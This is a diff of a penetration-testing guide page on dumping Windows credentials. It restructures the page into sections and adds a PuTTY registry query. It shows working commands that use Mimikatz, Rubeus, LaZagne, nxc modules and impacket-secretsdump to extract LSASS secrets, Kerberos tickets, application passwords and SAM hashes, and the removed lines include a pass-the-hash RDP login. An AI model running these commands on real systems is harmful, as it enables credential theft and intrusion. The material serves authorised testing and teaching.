@@ -23,21 +23,13 @@ In modern versions of Windows, password hashes are stored in the Local Security
 
 ## Prerequisites
 
-- SYSTEM or local administrator rights on a domain joined computer.
+- SYSTEM or local administrator rights on the target host.
 
 ## Exploit
 
-First, connect to the target computer via RDP.
+### LSASS credentials
 
-```bash
-# On Kali. Use "mstsc.exe" on Windows instead.
-xfreerdp /cert-ignore /u:$username /d:$domain /p:$password /v:$target
-
-# Using Path-the-Hash.
-xfreerdp /cert-ignore /u:$username /d:$domain /pth:$hash /v:$target
-```
-
-Then, use [Mimikatz](https://github.com/gentilkiwi/mimikatz) to dump credentials.
+To dump LSASS credentials, use [Mimikatz](https://github.com/gentilkiwi/mimikatz).
 
 ```bash
 # Start Mimikatz in a administrator PowerShell.
@@ -74,6 +66,8 @@ nxc smb $target -u $username -p $password -M mimikatz
 nxc smb $target -u $username -p $password -M lsassy
 ```
 
+### Kerberos tickets
+
 If you prefer focusing on Kerberos tickets, [Rubeus](https://github.com/GhostPack/Rubeus) is your friend.
 
 ```powershell
@@ -84,13 +78,17 @@ If you prefer focusing on Kerberos tickets, [Rubeus](https://github.com/GhostPac
 .\Rubeus.exe dump /luid:$luid /service:$service /nowrap
 ```
 
+### Applications
+
 You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from many Windows applications like browsers or WiFi.
 
 ```bash
 laZagne.exe all
 ```
 
-Finally, you can use `SAM` and `SYSTEM` files from your target to extract user hashes. These files are by default located at following **protected** paths:
+### SAM database
+
+You can use `SAM` and `SYSTEM` files from your target to extract user hashes. These files are by default located at following **protected** paths:
 * C:\Windows\System32\Config\SAM.
 * C:\Windows\System32\Config\SYSTEM.
 
@@ -98,6 +96,14 @@ If you manage to retrieve these two files on your Kali, extract hashes like this
 
 ```bash
 impacket-secretsdump LOCAL -sam SAM -system SYSTEM
+```
+
+### Putty
+
+If [PuTTY is installed](/windows/enumeration/#installed-softwares) on the target host, you can extract cached credentials by querying following registry key.
+
+```powershell
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
 ```
 
 ## Recommendations
